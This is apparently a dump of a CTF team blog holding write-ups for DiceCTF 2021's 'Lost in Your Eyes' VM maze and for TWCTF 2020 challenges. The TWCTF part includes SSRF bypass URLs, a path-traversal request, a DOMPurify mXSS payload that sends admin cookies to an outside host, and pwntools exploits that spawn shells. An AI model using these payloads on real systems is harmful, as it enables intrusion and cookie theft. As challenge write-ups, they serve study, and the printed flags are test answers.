[{"content":"Challenge Summary Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points).\n Your eyes are like a maze, and I hate mazes, so help me escape.\n We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.\nSolution This challenge is solved by harrier in collaboration with Mystiz. The solution is written in the prespective of harrier.\nPart I: Reversing the virtual machine Since this is a reverse question with a binary, I decided to open it with IDA. This is a simple VM-type binary, with the instruction code stored directly inside.\nIt looked so simple to me at the beginning, and I wonder why no one has solved it? After a bit of reversing and dynamically debugging, I know I was wrong.\nThe code of the binary itself is simple. It is a simple VM with the below variables\n Eight one-byte state registers ($R_0, R_1, \u0026hellip;, R_7$), a two-byte instruction pointer ($p$), an one-byte direction register ($d=1, 2, 3, 4$) deciding how the instruction pointer move, an one-byte select register ($k$) deciding the index of register for subsequent operations, and 65536 one-byte memory ($M_0, M_1, \u0026hellip;, M_{65535}$) storing the instructions and data.  Moreover, each byte in the memory represents an instruction, and the instruction set is defined below.\n   Value Operation     0 do nothing   1 - 8 $k \\leftarrow 0$, \u0026hellip;, $k \\leftarrow 7$   9 - 16 $R_k \\leftarrow R_0$, \u0026hellip;, $R_k \\leftarrow R_7$   17 $R_k \\leftarrow R_k + 1$   18 $R_k \\leftarrow R_k - 1$   19 $R_k \\leftarrow R_6 + R_7$   20 $R_k \\leftarrow R_6 - R_7$   21 $R_k \\leftarrow R_6 \\times R_7$   22 $R_k \\leftarrow \\text{floor}(R_6 / R_7)$   23 $R_k \\leftarrow R_6\\ \\text{mod}\\ R_7$   24 $R_k \\leftarrow \\text{~}R_k$   25 $R_k \\leftarrow -R_k$   26 $R_k \\leftarrow R_6\\ \\text{and}\\ R_7$   27 $R_k \\leftarrow R_6\\ \\text{or}\\ R_7$   28 $R_k \\leftarrow R_6\\ \\text{xor}\\ R_7$   29 $R_k \\leftarrow R_6 == R_7$   30 $R_k \\leftarrow R_6 \u0026lt; R_7$   31 $256R_0+R_1 \\leftarrow p, R_2 \\leftarrow d$   32 keycheck   33 $R_k \\leftarrow M_{256R_0 + R_1}$   34 $M_{256R_0 + R_1} \\leftarrow R_k$   35 $p \\leftarrow 256R_0 + R_1, d \\leftarrow R_2$   36 $R_k \\leftarrow \\text{input}$   37 $\\text{print}\\ R_k$   38 - 41 $d \\leftarrow 1$, \u0026hellip;, $d \\leftarrow 4$    Keycheck is the only curious instruction, where I don\u0026rsquo;t really know why it even exists. While I was reversing, I am only able to realize it is used perform some fatal checks.\nPart II: Building an emulator As the VM code is so simple, I decided to write an emulator in Python for ease of testing. It is not hard to write an emulation given that I have fully reversed the VM.\nSince the instruction code is embedded in the binary, I used gef to extract the code part, and while in emulation I translate the code to human (me) readable instruction for further reverse. I thought I could get the flag by just reading and parsing the translated code, and figuring out the whole logic. I was wrong and it was far more complicated than that.\nWith the emulator I was able to produce some code trace with various input, here\u0026rsquo;s some debug log I generated, with state of the VM and instruction it ran:\nCurrent state: [0, 46, 1, 22, 41, 35, 23, 0] 6 50 / 16 0 50/16 REGSEL = 6 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 6 49 / 16 0 49/16 LOAD REG[6] 0/46 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 48 / 16 0 48/16 REGSEL = 7 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 47 / 16 0 47/16 REG[7] = REG[6] == REG[7] Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 16 0 46/16 KEYCHECK REG[7] OK Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 16 3 45/16 SETMODE 3 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 15 2 45/15 SETMODE 2 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 15 2 47/15 REG[7] = REG[4] a/b is the notation I used to express instruction pointers, hereby $p = 256a + b$.\nI yield thousands of debug lines like the one above, and I tried to reverse the input process logic, and I realize there is a loop to detect what is my input, and it loop through to see whether the input matched those in the accepted characters.\nHow the characters are matched? Only here I realize the meaning of the keycheck operation. It is simply an if: If the condition holds, the instruction pointer will move two steps forward. Otherwise it will move only one.\nAlso, I was able to generate a list of possible inputs for the first byte, but then I was stuck and didn\u0026rsquo;t know how to do.\nPart III: Visualizing the inner program This part is written in the prespective of Mystiz.\nI decided to join harrier on this challenge at some point of time. At that moment, he have reversed all of the VM and part of the inner program. I want to know what proportation of the inner program he has reversed.\nAt first, I tried to use graphviz for visualization. The results are pretty dull, and most nodes have both the in-degrees and out-degrees being one.\nThis is not surprising, since the nodes have out-degrees larger than one only if they are branches. However, one interesting point from this is, in most of the time, if x1/y1 transits to x2/y2, then $|x_1-x_2|+|y_1+y_2|=1$\u0026hellip; Sounds like they are transited to adjacent grids in each instruction. I recalled some esolangs like Piet and Befunge, where the instruction pointers are actually 2D-coordinates. Although they are not equal, I had an idea to transform the whole thing into a two-dimensional grid. Well, maybe I should use HTML tables to visualize this. Since harrier is tracing the instructions executed, I can integrate it and generate a heatmap to check what is being covered.\nWow, this is pretty impressive. Now we can see that only a small proportion of the code in the inner program is visited. One thing that caught our attention is the maze on the top-left corner. Well, it seemed impossible for us to traverse inside the maze, since there are no arrows and we are very likely unable to turn without arrows.\nWe are able to identify a few zones inside the internal program:\n Request for input Payload area Loop structure The failing and the winning gadgets Maze  Part IV: Generating random ideas While testing with random inputs, it seemed that the input will be filling in 35/22, 35/23 and etc.\nMy first idea is to see whether if we can overwrite 35/1 by overflowing the input buffer. I was expecting that the original code can be corrupted by writing up to 35/255, then it will be wrapped back to 35/0 and 35/1. Turns out this is not possible since only the bottom right zone, with dimensions $47\\times34$, could be overwritten, filling line by line. The excessive input will simply be ignored.\nFrom the visualization, we can see that there are several print gadgets. For example, there is a failing gadget (which prints :() on the bottom left input part that will be traversed when a character outside the character set is given. There is also one on the upper middle of the map and one in the top right. Mystiz has identified that the former one has the same instructions as the one on the bottom left, so it would also be a failing gadget. The objective is simple: To make the instruction pointer end up on the top-right part, on the winning gadget.\nTo achieve this, one idea we had is to find ways to jump to the winning gadget directly. We found that the instruction pointer will be moving into the payload area when we are given a sufficiently long input. Therefore we can actually execute the payloads we sent.\nKnowing that, we tried to use the set address instruction (byte 0x23) to jump to the win widget. Unfortunately this does not work, since 0x23 is not allowed as an input.\nWe then come up an idea to try to use the conditional keycheck operation on the side of the square to escape out of the box. However keycheck does not allow an arrow pointing to itself. This does not work as well.\nIt seems that the only possible way is to navigate in the maze properly to get to the win gadget. But how is it possible if the maze do not have arrows?\nWell, there is an untouched part of the program - the arrow-putting gadget. With $R_4 \u0026lt; 4$, it can be used to put arrows on to the maze with the set register instruction (byte 0x21). We reversed it and and expected that it behaves as the following Python code snippet:\nfor x in range(1, 21): for y in range(1, 21): # We are not allowed to overwrite the \u0026#34;load address\u0026#34; instructions # i.e., the walls. if M[256*x + y] == 0x23: continue if R[4] \u0026lt; 4: M[256 * x + y] = 0x26 + R[4] # 0x26 0x27 0x28 0x29 # ↑ → ↓ ← Our objective is updated once again. Now the goal is to craft a payload to put appropriate arrows to let us navigate through the maze.\nBut wait, there is a check after the maze. Basically, there are some instructions in the maze to write $R_3, R_4, R_5$ and $R_7$. All we need to do is to walk through the maze in a specific order to pass the check.\nSo we finally have a clear target: design a route for the maze to pass through all the checks and get to the winning gadget.\nPart V: Crafting a smiley face In each iteration, I can control 8 registers, initially with $R_0 = 0, R_1 = 5, R_6 = x$ and $R_7 = y$. Initially, I copied the coordinates by $R_2 \\leftarrow x$ and $R_3 \\leftarrow y$ for further operations. Moreover, $R_0$ and $R_1$ can be used to build up to an arbitrary number in a few instructions.\nThe idea is to encode few arrows into a vertical block.\nHowever, the size of our input is pretty small. We need to make use of some techniques to save space. For instance, we can encode few arrows into one condition (Instead of checking x == x0 and y == y0, we can use y \u0026gt; y0, y mod 6 or even x == y as long as it traverses to the goal).\nWriting the payload is tiring without some auxiliary tools, so I used spreadsheet to write the instructions and wrote a simple CSV parser to convert those instruction to the input payload. After some unknown hours of manual work, I have eventually crafted the payload. This is how it looks in spreadsheet. 🙈\nIt is then converted as a payload to the binary. This is the emulated result that eventually returns a smiley face.\nPart VI: Final thoughts It was really a fun reverse challenge, while being easy to begin yet challenging to finish. Every part of the challenge is well-designed. The maze, the constraints, and even the instructions that making this challenge to work. That was an exciting and mind-blowing experience to explore and dig into rabbit holes of the challenge bit by bit.\nThanks to Mystiz for the great insights and the visualization, I think having the visualization itself is already having half of the challenge solved. 😀\n","permalink":"https://b6a.black/posts/2021-02-09-dicectf-liye/","summary":"Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points). We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.","title":"DiceCTF 2021: Lost in your Eyes"},{"content":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.7f000001.rbndr.us/admin-status\nAngular of the Universe, part one (Web, 139 points) Solved by Ozetta.\nObjective of flag 1 is to access /debug/answer route in Angular through the nginx proxy, but debug is filtered and /debug is blocked in nginx. In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So /debug/answer/../.. will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in server.ts, use d%65bug instead of debug. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload: GET /d%65bug/answer//../../a HTTP/1.1\nbfnote (Web, 320 points) Solved by harrier and Ozetta.\nDuring the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: \u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;CLICKME\u0026lt;/math\u0026gt;.\nEventually we have constructed the following payload to steal cookies from the admin:\n\u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;\u0026lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie\u0026gt;\u0026lt;/math\u0026gt; nothing more to say 2020 (Pwn, 111 points) Solved by cire meat pop.\nThis is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.\np = remote(\u0026#39;pwn02.chal.ctf.westerns.tokyo\u0026#39;, 18247) def fmtp(payload): p.sendline(payload) return p.recvuntil(\u0026#39;\u0026gt; \u0026#39;)[:-3] p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) payload = \u0026#34;%28$p\u0026#34; leak = int(fmtp(payload),16) stack = leak-0x118 ret = stack+0x108 payload = \u0026#34;%7$s||||\u0026#34;+p64(stack) payload = fmtstr.fmtstr_payload(6, {ret: stack+8}, write_size=\u0026#39;byte\u0026#39;) fmtp(payload) payload = \u0026#39;q\u0026#39;*8 + asm(shellcraft.amd64.linux.sh()) p.sendline(payload) p.interactive() We have the flag: TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}. Translating via google: This is TWCTF, which has begun. Where has kotoshi gone?\nOnline Nonogram (Pwn, 252 points) Solved by cire meat pop.\nThe vulnerability is that we can overwrite the vector pointer to maze chunks.\nFirst leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with /bin/sh.\np = remote(\u0026#39;pwn03.chal.ctf.westerns.tokyo\u0026#39;, 22915) def calc(off): return int(((off+8-1)*8)**0.5)+1 def dele(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Success\u0026#39;) def add(title, size, payload): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, title) p.sendlineafter(\u0026#39;Size: \u0026#39;, str(size)) p.sendafter(\u0026#39;Puzzle: \u0026#39;, payload) def leakp(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Row\\\u0026#39;s Numbers\\n\u0026#39;) a = p.recvuntil(\u0026#39;\\nColumn\\\u0026#39;s Numbers\u0026#39;)[:-17] p.sendlineafter(\u0026#39;:\u0026#39;,\u0026#39;q\u0026#39;) p.recvuntil(\u0026#39;invalid choice\u0026#39;) return a # leak heap info offset = 0x400 add(\u0026#39;test2\u0026#39;, calc(offset), \u0026#39;\\0\u0026#39;*offset) leak = leakp(2).replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;)[2:][::-1][32:] heap = int(leak,2) log.info(\u0026#39;leak: {}\u0026#39;.format(hex(heap))) target = heap+0x60 new_heap = heap+0x520 heap_base = heap-0x11f90 # add padding to prevent freed large chunk consolidate with top chunk  add(\u0026#39;pad\u0026#39;, 0x10, \u0026#39;\\n\u0026#39;) dele(2) # forge vector and maze chunk forged_chunk1 = new_heap+0xb0 forged_chunk2 = new_heap+0xe0 forged = flat(new_heap+0x40,new_heap+0x90,0,0,0,0,0,0x41) forged+= flat(0, target, target, 6,6,6,6,1,0x81) forged+= flat(0x81, 5, forged_chunk1, forged_chunk2, 0x81,6,6,6,1,0) forged+= flat(0x81)+ p64(0x81)*40+p64(0x121)*20 forged = forged.ljust(0x400,\u0026#39;\\0\u0026#39;) forged+= flat(new_heap, new_heap+0x10, new_heap+0x38) add(\u0026#39;forged\u0026#39;, 0x70, forged) # leak libc info p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;0 : \u0026#39;) leak = u64(p.recv(6)+\u0026#39;\\0\\0\u0026#39;) libc_base = leak-0x1ebfd0 log.info(\u0026#39;libc_base: {}\u0026#39;.format(hex(libc_base))) p.sendlineafter(\u0026#39;Index\u0026#39;,\u0026#39;-1\u0026#39;) # free overlapped chunk to tcache  dele(1) add(\u0026#39;a\u0026#39;, 50, \u0026#39;a\u0026#39;) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;v\u0026#39;*0x48+p64(0x81)+p64(libc_base+libc.symbols[\u0026#39;__free_hook\u0026#39;])) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;whatever\u0026#39;) # write system to free hook add(\u0026#39;q\u0026#39;, 30, p64(libc_base+libc.symbols[\u0026#39;system\u0026#39;])) # trigger free hook p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, \u0026#39;/bin/sh\\x00\u0026#39;+\u0026#39;\\0\u0026#39;*0x100) p.interactive() Flag: TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}. Translating via google: I'm pu → I love you. WTF?\nReversing iS Amazing (Reverse, 126 points) Solved by Mystiz.\nOpen the binary with IDA. We can see that the binary signs argv[1] (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.\nSince we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\\ \\text{mod}\\ n$. Unpadding the message we have TWCTF{Rivest_Shamir_Adleman}.\nTamarin (Reverse, 224 points) Solved by harrier and Mystiz.\nWe are given an APK for the challenge. As how we work on every single Android reversing challenge, we use apktool to decode the file. Noticing that it is developed in Xamarin, we use the Github repository tjg1/mono_unbundle to unbundle dll.so to a C# DLL source file. We now have source codes to read!\nIn particular we have this function:\npublic static bool Func4(string flag) { ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 }; byte[] bytes = Encoding.ASCII.GetBytes(flag); int length = flag.Length; if ((length \u0026amp; 3) != 0) { Array.Resize\u0026lt;byte\u0026gt;(ref bytes, length + (4 - (length \u0026amp; 3))); } for (int i = length; i \u0026lt; bytes.Length; i++) { bytes[i] = 0; } if (bytes.Length != Check.equations_arr.GetLength(0) * 4) { return false; } object lockObj = new object(); ConcurrentBag\u0026lt;bool\u0026gt; checkResults = new ConcurrentBag\u0026lt;bool\u0026gt;(); List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt; list = new List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(); for (int j = 0; j \u0026lt; Check.equations_arr.GetLength(0); j++) { List\u0026lt;uint\u0026gt; list2 = new List\u0026lt;uint\u0026gt;(); list2.Add(BitConverter.ToUInt32(bytes, j * 4)); for (int k = 0; k \u0026lt; Check.equations_arr.GetLength(1); k++) { list2.Add(Check.equations_arr[j, k]); } list.Add(list2); } Parallel.ForEach\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(list, parallelOptions, delegate(List\u0026lt;uint\u0026gt; equation) { object lockObj = lockObj; lock (lockObj) { uint num = Check.Func3(); for (int l = 0; l \u0026lt; 10000; l++) { num = Check.Func2(equation, num, equation.Count - 2); } checkResults.Add(num == equation[equation.Count - 1]); } }); return Enumerable.All\u0026lt;bool\u0026gt;(checkResults.ToArray(), (bool x) =\u0026gt; x); }  Additionally, we have a equations_arr which is a $22\\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 232):\nFirst we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.\nWhat's $n$? It is the output of Check.Func3() and it actually is a random number... Is it even solvable?\n  Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (a bit means few sheets of paper and a lot of time), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.\nAfter all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:\nTWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry} easy-hash (Crypto, 75 points) Solved by Mystiz.\nThe challenge defines a new hash algorithm, easy_hash. It is defined by the following function:\ndef easy_hash(x): m = 0 for i in range(len(x) - 3): m += struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, x[i:i + 4])[0] m = m \u0026amp; 0xffffffff return m The objective is to find a collision pair: for twctf: please give me the flag of 2020\nMathematically, if $M=m_1m_2m_3\\dots m_n$, then\n\\[\\text{easy\\_hash}(M):=\\sum_{i=1}^{n-3}\\left(\\text{0x100}^3m_{i+3}+\\text{0x100}^2m_{i+2}+\\text{0x100}m_{i+1}+m_i\\right).\\]\nEquivalently it would be\n\\[ \\begin{aligned} \\text{easy\\_hash}(M) := m_1\u0026 + \\text{0x101} m_2 + \\text{0x10101} m_3 + \\text{0x1010101}\\sum_{i=4}^{n-3}m_i \\\\ \\end{aligned} \\]\nHence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that \u0026quot;f\u0026quot; = \u0026quot;F\u0026quot; + \u0026quot; \u0026quot;, we can simply replace flag into F lag.\n$ curl \u0026#34;https://crypto01.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#34;twctf: please give me the F lag of 2020\u0026#34; # Congrats! The flag is TWCTF{colorfully_decorated_dream} sqrt (Crypto, 216 points) Solved by Mystiz.\nIn this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \\equiv m^{2^{64}}\\ (\\text{mod}\\ p)$ - and the objective is of course to recover the flag $m$.\nMy first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.\nFortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \\equiv 1\\ (\\text{mod}\\ p-1)$. Then $c^d \\equiv m^{d\\cdot 2^{64}}\\equiv m^{2^{30}}\\ (\\text{mod}\\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.\nInstead we compute a 230-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \\equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}.\ntwin-d (Crypto, 172 points) Solved by harrier and Mystiz.\nThis is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,\n\\[ \\begin{cases}\\begin{aligned} e_2 (d+2) \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\\\ e_1 d \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\end{aligned}\\end{cases}. \\]\nharrier has observed that $e_2d \\equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:\n\\[0 \\equiv e_1(e_2d) - e_2(e_1d) \\equiv e_1(1-2e_2)-e_2 \\equiv e_1 - e_2 - 2e_1e_2\\ \\left(\\text{mod}\\ \\phi(n)\\right).\\]\nIn this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \\equiv 1 \\ \\left(\\text{mod}\\ \\phi(n)\\right)$. Hence it suffices to recover the flag from the ciphertext - TWCTF{even_if_it_is_f4+e}.\nThe Melancholy of Alice (Crypto, 242 points) Solved by Mystiz.\nIn this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.\nN = 1024 def generateKey(): p = getStrongPrime(N) q = (p - 1) // 2 x = getRandomRange(2, q) g = 2 h = pow(g, x, p) pk = (p, q, g, h) sk = x return (pk, sk) def encrypt(m, pk): (p, q, g, h) = pk r = getRandomRange(2, q) c1 = pow(g, r, p) c2 = m * pow(h, r, p) % p return (c1, c2) Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?\nWithout any clues, we were messing around. Eventually we tried to factorize $p-1$.\n    Wait what? Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be safe but not strong.\nOkay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.\n# p, q, g, h are redacted to save up some spaces with open(\u0026#39;challenge/ciphertext.txt\u0026#39;) as f: cs = list(map(eval, f.read().strip().split(\u0026#39;\\n\u0026#39;))) r = 5710354319 assert (p-1) % r == 0 x = dlog.bsgs(pow(g, (p-1)//r, p), pow(h, (p-1)//r, p), p, r) assert pow(g, x * (p-1)//r, p) == pow(h, (p-1)//r, p) ms = b\u0026#39;\u0026#39; m_map = list(map(lambda m: pow(m, (p-1)//r, p), range(0x20, 0x80))) print(m_map) for c1, c2 in cs: c1 = pow(c1, (p-1)//r, p) c2 = pow(c2, (p-1)//r, p) m = c2 * powmod(c1, -x, p) % p assert m in m_map ms += bytes([m_map.index(m) + 0x20]) print(ms) XOR and shift encryptor (Crypto, 303 points) Solved by Mystiz.\nThis is more like a PPC challenge instead of a cryptography challenge. There is a randgen function, that serves as the core of the challenge, defined below:\ndef randgen(): global s,p a = 3 b = 13 c = 37 s0 = s[p] p = (p + 1) \u0026amp; 63 s1 = s[p] res = (s0 + s1) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s1 ^= (s1 \u0026lt;\u0026lt; a) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s[p] = (s1 ^ s0 ^ (s1 \u0026gt;\u0026gt; b) ^ (s0 \u0026gt;\u0026gt; c)) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) return res They are utilizing the \u0026quot;inefficiency\u0026quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2100). Of course the naive approach doesn't work - you will wait forever.\nHowever, if we are only considering the state transition (i.e., how s is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.\nWe can write transitions under the definition (note that the $+$ operation is actually operated under $\\text{GF}(2)$, i.e., it is a XOR):\n $s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$, $s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$, ...  Hence, we can define a $64^2\\times64^2$ transition matrix $T$ over $\\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.\nHelp. I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn\u0026rsquo;t it be $O(m^{2.3737}\\cdot\\log n)$ to compute $M^n$ for a $m\\times m$ matrix?).  Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: FAKEFLAG{THIS_IS_FAKE_FLAG}.\nOops, nope. I mean\nTWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!} circular (Crypto, 370 points) Solved by Mystiz.\nThere are two endpoints provided, pubkey and verify. The pubkey endpoint returns a fix n and k.\n$ curl \u0026#34;https://crypto02.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;pubkey\u0026#34;}\u0026#39; # {\u0026#34;pubkey\u0026#34;:{\u0026#34;n\u0026#34;:\u0026#34;25299...\u0026#34;,\u0026#34;k\u0026#34;:\u0026#34;31019...\u0026#34;}} And one can submit x, y and msg to the verify endpoint. It is verifying a signature in the following way:\n\\[x^2 + ky^2 \\equiv \\text{hash}(msg)\\ (\\text{mod}\\ n).\\]\nIn particular, you can get the flag when the signature is correct and msg == 'SUNSHINE RHYTHM'. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \\equiv m\\ (\\text{mod}\\ n)$. This is a simplified version of OSS schemes.\nI was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing and came across to Pollard's algorithm (From An Efficient Solution of the Congruence x2 + ky2 = m (mod n) by Pollard and Schnorr). Moreover, the algorithm is described very clearly in An Exposition of Pollard's Algorithm for Quadratic Congruences by Shallit. I have an implementation of Pollard's algorithm following their procedures.\nSupplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the verify endpoint would give us the flag - TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}.\nBirds (Misc, 41 points) Solved by cire meat pop and Mystiz.\nNothing much is given from the challenge description, there are a multiple lines /^[A-Z]{2}[0-9]{3,4}$/'s.\nBC552 AC849 JL106 PQ448 JL901 LH908 NH2177 After a bit of Googling, those are flight numbers. What do they mean? Let's see where they depart and arrive:\n   Flight Depart from Arrive to     BC552 OKA NGO   AC849 LHR YYZ   JL106 ITM HND   PQ448 TBS ODS   JL901 HND OKA   LH908 FRA LHR   NH2177 NRT ITM    Hmm... We can see some locations shown more than once. There must be some meaning. Let's connect them.\nNRT -\u0026gt; ITM -\u0026gt; HND -\u0026gt; OKA -\u0026gt; NGO FRA -\u0026gt; LHR -\u0026gt; YYZ TBS -\u0026gt; ODS By taking the first letter from each of them, we get:\nNIHON FLY TO Oh and finally we have the flag: TWCTF{FLYTONIHON}. Unfortunately the finals is online this year... (And we are not qualified, too)\nAddendum: We did!\nmask (Misc, 26 points) Solved by harrier and cire meat pop.\nThere is a list of IP addresses and maybe subnet mask in the challenge description.\n192.168.55.86/255.255.255.0 192.168.80.198/255.255.255.128 192.168.1.228/255.255.255.128 192.168.90.68/255.255.254.0 192.168.8.214/255.255.255.128 ... The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is 0b111101, which is = in ASCII... Is it encoded with base64?\nimport base64 with open(\u0026#39;mask.txt\u0026#39;) as f: s = f.read().split(\u0026#39;\\n\u0026#39;) a = \u0026#39;\u0026#39; for i in s: lr = i.split(\u0026#39;/\u0026#39;) l = lr[0].split(\u0026#39;.\u0026#39;) r = lr[1].split(\u0026#39;.\u0026#39;) a+=chr(int(l[3])\u0026amp;(255^int(r[3]))) print(base64.b64decode(a)) The output is: TWCTF{Are-you-using-a-mask?}\n","permalink":"https://b6a.black/posts/2020-09-23-twctf/","summary":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF 